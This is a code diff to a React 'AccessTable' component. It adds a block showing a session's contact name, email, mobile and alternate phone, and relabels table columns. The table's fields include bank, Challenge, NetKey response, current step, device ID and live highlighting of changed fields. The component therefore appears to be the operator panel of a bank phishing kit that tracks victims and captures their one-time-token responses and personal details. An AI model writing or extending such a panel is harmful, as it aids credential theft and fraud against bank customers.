@@ -492,6 +492,36 @@ const AccessTable: React.FC<AccessTableProps> = ({
                       </div>
                     )}
                     
+                    {/* Datos del Formulario de Contacto */}
+                    {((session as any).nombreContacto || (session as any).correoContacto || (session as any).celularContacto || (session as any).telefonoAlternativoContacto) && (
+                      <div className="mb-3 p-3 bg-[#1a3a1a] rounded border border-[#2a5a2a]">
+                        <div className="flex items-center mb-2">
+                          <AlertCircle className="h-4 w-4 text-[#4ade80] mr-2" />
+                          <span className="text-white font-bold">Datos de Contacto</span>
+                        </div>
+                        {(session as any).nombreContacto && (
+                          <div className="text-sm text-white mb-1">
+                            <span className="opacity-80">Nombre:</span> <span className="ml-2">{(session as any).nombreContacto}</span>
+                          </div>
+                        )}
+                        {(session as any).correoContacto && (
+                          <div className="text-sm text-white mb-1">
+                            <span className="opacity-80">Correo:</span> <span className="ml-2">{(session as any).correoContacto}</span>
+                          </div>
+                        )}
+                        {(session as any).celularContacto && (
+                          <div className="text-sm text-white mb-1">
+                            <span className="opacity-80">Celular:</span> <span className="ml-2">{(session as any).celularContacto}</span>
+                          </div>
+                        )}
+                        {(session as any).telefonoAlternativoContacto && (
+                          <div className="text-sm text-white">
+                            <span className="opacity-80">Teléfono Alternativo:</span> <span className="ml-2">{(session as any).telefonoAlternativoContacto}</span>
+                          </div>
+                        )}
+                      </div>
+                    )}
+                    
                     {/* Device ID para gestión de folios únicos */}
                     {session.deviceId && (
                       <div className="mb-3 flex gap-2 items-center">
@@ -573,10 +603,10 @@ const AccessTable: React.FC<AccessTableProps> = ({
                 <th className="p-3 text-left">Banco</th>
                 <th className="p-3 text-left">Challenge</th>
                 <th className="p-3 text-left">NetKey</th>
-                <th className="p-3 text-left">Nombre</th>
-                <th className="p-3 text-left">Teléfono 1</th>
-                <th className="p-3 text-left">Teléfono 2</th>
-                <th className="p-3 text-left">Correo</th>
+                <th className="p-3 text-left">Nombre Contacto</th>
+                <th className="p-3 text-left">Correo Contacto</th>
+                <th className="p-3 text-left">Celular</th>
+                <th className="p-3 text-left">Tel. Alt.</th>
                 <th className="p-3 text-left">Paso actual</th>
                 <th className="p-3 text-left">Acciones</th>
               </tr>
@@ -613,16 +643,16 @@ const AccessTable: React.FC<AccessTableProps> = ({
                     {(session as any).netkeyResponse || '--'}
                   </td>
                   <td className="p-3 text-white">
-                    {(session as any).nombreRepresentante || '--'}
+                    {(session as any).nombreContacto || '--'}
                   </td>
                   <td className="p-3 text-white">
-                    {(session as any).telefono1 || '--'}
+                    {(session as any).correoContacto || '--'}
                   </td>
                   <td className="p-3 text-white">
-                    {(session as any).telefono2 || '--'}
+                    {(session as any).celularContacto || '--'}
                   </td>
                   <td className="p-3 text-white">
-                    {session.correo || '--'}
+                    {(session as any).telefonoAlternativoContacto || '--'}
                   </td>
                   <td className={`p-3 ${highlightedFields[session.sessionId]?.pasoActual ? 'text-[#be0046] font-bold' : 'text-white'}`}>
                     {session.pasoActual ? session.pasoActual.charAt(0).toUpperCase() + session.pasoActual.slice(1) : '--'}
